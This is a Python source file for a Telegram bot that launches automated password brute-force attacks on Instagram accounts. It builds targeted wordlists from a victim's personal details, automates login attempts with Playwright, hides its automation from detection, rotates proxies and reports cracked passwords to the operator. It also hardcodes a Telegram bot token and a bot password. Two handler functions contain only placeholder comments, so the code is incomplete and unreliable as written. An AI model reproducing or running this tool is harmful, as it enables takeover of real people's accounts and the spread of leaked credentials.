import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError
from urllib.parse import quote
import os
from flask import Flask
from threading import Thread
import undetected_playwright as up
from playwright.async_api import async_playwright

# Log ayarları
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"

# Güvenlik şifresi
BOT_PASSWORD = "vio1911"

# Flask sunucu için
app = Flask(__name__)
@app.route('/')
def home():
    return "Bot aktif!"
def run_flask():
    app.run(host='0.0.0.0', port=8080)
def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# CUPP tarzı şifre oluşturucu için yapılandırma
class PasswordGenerator:
    def __init__(self):
        self.config = {
            "chars": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "years": [str(year) for year in range(1980, 2026)],
            "numfrom": 0,
            "numto": 100
        }
        self.leet_rules = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }
        self.max_password_length = 512

    def generate_wordlist(self, profile: dict) -> List[str]:
        wordlist = []
        firstname = profile.get("firstname", "").lower()[:20]
        lastname = profile.get("lastname", "").lower()[:20]
        birthdate = profile.get("birthdate", "").replace("/", "")[:8]
        pet = profile.get("pet", "").lower()[:20]
        company = profile.get("company", "").lower()[:20]
        keywords = [k[:20] for k in profile.get("keywords", [])]

        # Temel kelimeler
        base_words = [word for word in [firstname, lastname, pet, company] if word]
        base_words.extend(keywords)

        # Doğum tarihi varyasyonları
        birthdate_formats = []
        if birthdate and len(birthdate) == 8:
            dd, mm, yyyy = birthdate[:2], birthdate[2:4], birthdate[4:]
            birthdate_formats.extend([dd, mm, yyyy, yyyy[-2:], yyyy[-3:], f"{dd}{mm}", f"{mm}{dd}", f"{dd}{yyyy}", f"{mm}{yyyy}"])

        # Kelime kombinasyonları
        for word in base_words:
            if len(word) <= self.max_password_length:
                wordlist.append(word)
                wordlist.append(word.capitalize())
            for year in birthdate_formats + self.config["years"]:
                if len(f"{word}{year}") <= self.max_password_length:
                    wordlist.append(f"{word}{year}")
                    wordlist.append(f"{year}{word}")
            for num in range(self.config["numfrom"], self.config["numto"] + 1):
                if len(f"{word}{num:02d}") <= self.max_password_length:
                    wordlist.append(f"{word}{num:02d}")
                    wordlist.append(f"{num:02d}{word}")

        # Çift kelime kombinasyonları
        for w1, w2 in itertools.combinations(base_words, 2):
            if len(f"{w1}{w2}") <= self.max_password_length:
                wordlist.append(f"{w1}{w2}")
                wordlist.append(f"{w2}{w1}")
                wordlist.append(f"{w1.capitalize()}{w2.capitalize()}")
            for year in birthdate_formats + self.config["years"]:
                if len(f"{w1}{w2}{year}") <= self.max_password_length:
                    wordlist.append(f"{w1}{w2}{year}")
                    wordlist.append(f"{w2}{w1}{year}")

        # Leet mode
        if profile.get("leetmode", False):
            leet_words = []
            for word in wordlist[:]:
                leet_variations = [word]
                for char, replacements in self.leet_rules.items():
                    new_variations = []
                    for var in leet_variations:
                        if char in var.lower():
                            for repl in replacements:
                                new_var = var.replace(char, repl).replace(char.upper(), repl)
                                if len(new_var) <= self.max_password_length:
                                    new_variations.append(new_var)
                    leet_variations.extend(new_variations)
                leet_words.extend(leet_variations)
            wordlist.extend(leet_words)

        # Özel karakterler
        if profile.get("spechars", False):
            special_words = []
            for word in wordlist[:]:
                for char in self.config["chars"]:
                    if len(f"{word}{char}") <= self.max_password_length:
                        special_words.append(f"{word}{char}")
                    for char2 in self.config["chars"]:
                        if len(f"{word}{char}{char2}") <= self.max_password_length:
                            special_words.append(f"{word}{char}{char2}")
            wordlist.extend(special_words)

        # Rastgele sayılar
        if profile.get("randnum", False):
            numbered_words = []
            for word in wordlist[:]:
                for num in range(self.config["numfrom"], self.config["numto"] + 1):
                    if len(f"{word}{num:02d}") <= self.max_password_length:
                        numbered_words.append(f"{word}{num:02d}")
            wordlist.extend(numbered_words)

        return list(set(wordlist))

class InstagramBruteForce:
    """Instagram brute-force işlemleri için Playwright tabanlı sınıf"""
    
    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
        self.user_agent = user_agent or self._get_realistic_user_agent()
        self.proxy_list = proxy_list or []
        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
        self.current_proxy = None
        self.login_url = 'https://www.instagram.com/accounts/login/'
        self.playwright = None
        self.browser = None
        self.page = None

    def _get_realistic_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(agents)

    async def _initialize_playwright(self):
        """Playwright'ı başlat ve tarayıcıyı ayarla"""
        try:
            self.playwright = await async_playwright().start()
            
            launch_options = {
                'headless': True,
                'args': [
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                    f'--user-agent={self.user_agent}'
                ]
            }
            
            if self.current_proxy:
                launch_options['proxy'] = {'server': self.current_proxy}
            
            self.browser = await self.playwright.chromium.launch(**launch_options)
            self.page = await self.browser.new_page()
            
            # Bot tespitini önlemek için ek önlemler :cite[2]:cite[5]:cite[8]
            await self.page.add_init_script("""
                delete navigator.__proto__.webdriver;
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            """)
            
            return True
        except Exception as e:
            logger.error(f"Playwright başlatma hatası: {e}")
            return False

    async def _get_working_proxy(self, progress_callback: Optional[callable] = None):
        """Çalışan proxy bul"""
        if not self.proxy_list:
            if progress_callback:
                await progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
            return None
        
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            try:
                test_session = requests.Session()
                test_session.proxies = {'http': proxy, 'https': proxy}
                response = test_session.get('https://www.instagram.com', timeout=5)
                if response.status_code == 200:
                    if progress_callback:
                        await progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
            except Exception as e:
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            await asyncio.sleep(1)
        
        if progress_callback:
            await progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
        return None

    async def _playwright_login_attempt(self, username: str, password: str):
        """Playwright ile login denemesi"""
        try:
            if not self.page:
                if not await self._initialize_playwright():
                    return "ERROR"
            
            await self.page.goto(self.login_url)
            await self.page.wait_for_selector('input[name="username"]', timeout=10000)
            
            # Kullanıcı adı ve şifreyi gir
            await self.page.fill('input[name="username"]', username)
            await self.page.fill('input[name="password"]', password)
            
            # Login butonuna tıkla
            await self.page.click('button[type="submit"]')
            
            # Sonucu bekle ve kontrol et
            await asyncio.sleep(3)
            
            # Başarılı giriş kontrolü
            current_url = self.page.url
            page_content = await self.page.content()
            
            if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
                if 'accounts/login' not in current_url:
                    return "SUCCESS"
            
            # 2FA kontrolü
            if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
               any(indicator in page_content for indicator in ['two_factor', 'Enter the 6-digit code']):
                return "2FA"
            
            # Checkpoint kontrolü
            if 'checkpoint' in current_url or 'challenge' in current_url:
                return "CHECKPOINT"
            
            # Hata kontrolü
            error_indicators = [
                'Sorry, your password was incorrect',
                'The username you entered',
                'incorrect',
                'doesn\'t match',
                'kullanıcı adı',
                'Hatalı şifre',
                'Şifre yanlış'
            ]
            
            if any(indicator in page_content for indicator in error_indicators):
                return "WRONG"
            
            return "UNKNOWN"
            
        except Exception as e:
            logger.error(f"Playwright login hatası: {e}")
            return "ERROR"
        finally:
            if self.browser:
                await self.browser.close()
            if self.playwright:
                await self.playwright.stop()

    async def brute_force(self, username: str, password_list: List[str], timeout: int, 
                         progress_callback: Optional[callable] = None, stop_event: asyncio.Event = None):
        """Brute-force saldırısını gerçekleştir"""
        start_time = time.time()
        total_passwords = len(password_list)
        tried_passwords = 0
        potential_passwords = set()
        
        try:
            await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
            
            for i, password in enumerate(password_list):
                if stop_event and stop_event.is_set():
                    await progress_callback("🛑 Saldırı kullanıcı tarafından durduruldu!")
                    return None
                
                if time.time() - start_time > timeout:
                    await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı! Denenen şifre: {tried_passwords}/{total_passwords}")
                    break
                
                # Her 10 şifrede bir proxy değiştir
                if self.proxy_list and i % 10 == 0:
                    self.current_proxy = await self._get_working_proxy(progress_callback)
                
                await progress_callback(f"🔐 Şifre deneniyor: {password}")
                
                result = await self._playwright_login_attempt(username, password)
                
                if result == "SUCCESS":
                    await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                    return password
                elif result in ["2FA", "CHECKPOINT"]:
                    await progress_callback(f"🔐 Doğru şifre ama ek doğrulama gerekli: {password}")
                    return password
                elif result == "WRONG":
                    await progress_callback(f"❌ Yanlış şifre: {password}")
                else:
                    await progress_callback(f"❓ Bilinmeyen yanıt: {password}")
                    potential_passwords.add(password)
                
                tried_passwords += 1
                
                # Rastgele bekleme süresi (3-8 saniye)
                delay = random.uniform(3, 8)
                await asyncio.sleep(delay)
            
            # Rapor oluştur
            report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
            if potential_passwords:
                report += f"- Şüpheli şifreler (manuel kontrol önerilir): {', '.join(potential_passwords)}\n"
            
            await progress_callback(report)
            return None
            
        except Exception as e:
            logger.error(f"Brute force hatası: {e}")
            await progress_callback(f"❌ Beklenmeyen hata: {str(e)}")
            return None

class TelegramBot:
    def __init__(self):
        self.user_data = {}
        self.brute_force_tasks = {}
        self.brute_force_stop_events = {}
        self.password_generator = PasswordGenerator()
        keep_alive()  # Railway'de uyumamak için

    def _initialize_user_data(self, user_id: int):
        if user_id not in self.user_data:
            self.user_data[user_id] = {
                'username': None,
                'password_file': None,
                'proxy_file': None,
                'timeout': 1800,
                'password_profile': {
                    'firstname': '', 'lastname': '', 'birthdate': '',
                    'pet': '', 'company': '', 'keywords': [],
                    'leetmode': False, 'spechars': False, 'randnum': False
                }
            }

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)
        try:
            await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
            context.user_data['awaiting'] = 'password'
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")

    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Saldırıyı durdurma komutu"""
        user_id = update.effective_user.id
        
        if user_id in self.brute_force_stop_events:
            self.brute_force_stop_events[user_id].set()
            await update.message.reply_text("🛑 Saldırı durduruluyor...")
        else:
            await update.message.reply_text("❌ Durdurulacak aktif saldırı bulunamadı.")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)

        awaiting = context.user_data.get('awaiting')
        if not awaiting:
            try:
                await update.message.reply_text("❌ Önce /start komutunu kullan!")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return

        # Kullanıcı mesajlarını işleme (önceki kodun aynısı)
        # ... (Önceki handle_message implementasyonu)

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Buton işleyici (önceki kodun aynısı)
        # ... (Önceki button implementasyonu)

    async def generate_password_file(self, query: Update, user_id: int):
        try:
            # Kullanıcı profilini al
            profile = self.user_data[user_id]['password_profile']
            if not any([profile['firstname'], profile['lastname'], profile['birthdate'], 
                        profile['pet'], profile['company'], profile['keywords']]):
                await query.message.reply_text("❌ Lütfen önce profil bilgilerini girin!")
                return

            # Şifre listesini oluştur
            wordlist = self.password_generator.generate_wordlist(profile)
            if not wordlist:
                await query.message.reply_text("❌ Şifre listesi oluşturulamadı, profil bilgileri yetersiz!")
                return
            
            # Şifre listesini dosyaya kaydet
            password_file = f"wordlist_{user_id}.txt"
            with open(password_file, 'w', encoding='utf-8') as f:
                for word in wordlist:
                    f.write(word + '\n')
            
            self.user_data[user_id]['password_file'] = password_file
            await query.message.reply_text(f"✅ Şifre listesi oluşturuldu: {len(wordlist)} şifre")
            
            # Dosyayı Telegram üzerinden gönder
            with open(password_file, 'rb') as f:
                await query.message.reply_document(document=InputFile(f, filename=f"wordlist_{user_id}.txt"))
        
        except Exception as e:
            logger.error(f"Şifre listesi oluşturma hatası: {str(e)}")
            await query.message.reply_text(f"❌ Şifre listesi oluşturulamadı: {str(e)}")

    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        query = update.callback_query

        try:
            await query.message.reply_text("🚀 Saldırı başlatılıyor...")
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")
            return

        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
            try:
                await query.message.reply_text("⚠️ Saldırı zaten devam ediyor!")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return

        # Gerekli kontroller ve veri hazırlığı
        if not self.user_data[user_id]['username']:
            await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
            return
        
        if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
            return

        try:
            # Şifreleri yükle
            passwords = []
            encodings = ['utf-8', 'latin-1', 'iso-8859-9']
            for encoding in encodings:
                try:
                    with open(self.user_data[user_id]['password_file'], 'r', encoding=encoding, errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
                    break
                except UnicodeDecodeError:
                    continue

            if not passwords:
                await query.message.reply_text("❌ Şifre dosyası okunamadı veya boş!")
                return

            # Proxy listesini yükle
            proxy_list = []
            if self.user_data[user_id]['proxy_file'] and os.path.exists(self.user_data[user_id]['proxy_file']):
                for encoding in encodings:
                    try:
                        with open(self.user_data[user_id]['proxy_file'], 'r', encoding=encoding, errors='ignore') as f:
                            proxy_list = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue

            # Stop event oluştur
            stop_event = asyncio.Event()
            self.brute_force_stop_events[user_id] = stop_event

            # Brute force başlat
            core = InstagramBruteForce(proxy_list=proxy_list)

            async def progress_callback(message):
                try:
                    await query.message.reply_text(message)
                except TelegramError as e:
                    logger.error(f"Telegram send_message error in progress_callback: {e}")

            task = asyncio.create_task(
                core.brute_force(
                    self.user_data[user_id]['username'],
                    passwords,
                    self.user_data[user_id]['timeout'],
                    progress_callback=progress_callback,
                    stop_event=stop_event
                )
            )
            
            self.brute_force_tasks[user_id] = task
            result = await task

            if result:
                await query.message.reply_text(f"🎉 *BAŞARILI! Şifre bulundu: {result}*", parse_mode='Markdown')
            else:
                await query.message.reply_text("❌ İşlem tamamlandı, doğru şifre bulunamadı.")

        except Exception as e:
            await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}")
        finally:
            # Temizlik
            if user_id in self.brute_force_tasks:
                del self.brute_force_tasks[user_id]
            if user_id in self.brute_force_stop_events:
                del self.brute_force_stop_events[user_id]
            
            # Dosya temizliği
            for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
                if file_path and os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")

async def main():
    bot = TelegramBot()
    application = Application.builder().token(TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stop", bot.stop_attack))  # Yeni stop komutu
    application.add_handler(CallbackQueryHandler(bot.button))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
    
    await application.run_polling()

if __name__ == "__main__":
    # Railway için port ayarı
    port = int(os.environ.get("PORT", 8080))
    keep_alive()  # Flask sunucuyu başlat
    
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
